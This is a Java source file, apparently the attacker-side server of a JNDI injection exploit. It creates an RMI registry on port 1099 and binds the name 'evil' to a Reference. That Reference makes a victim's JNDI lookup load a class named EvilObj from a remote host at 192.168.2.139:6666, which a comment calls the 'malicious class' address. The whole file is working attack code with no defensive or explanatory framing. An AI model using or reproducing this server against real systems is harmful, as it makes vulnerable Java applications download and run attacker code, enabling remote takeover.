import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099); // 绑定注册表端口
        String url = "http://192.168.2.139:6666/"; // 加载恶意类的远程地址
        System.out.println("create registry in 1099");
        Reference reference = new Reference("EvilObj", "EvilObj", url); // 调用Reference类并控制url为远程地址
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); // 封装
        registry.bind("evil", referenceWrapper);
    }
}
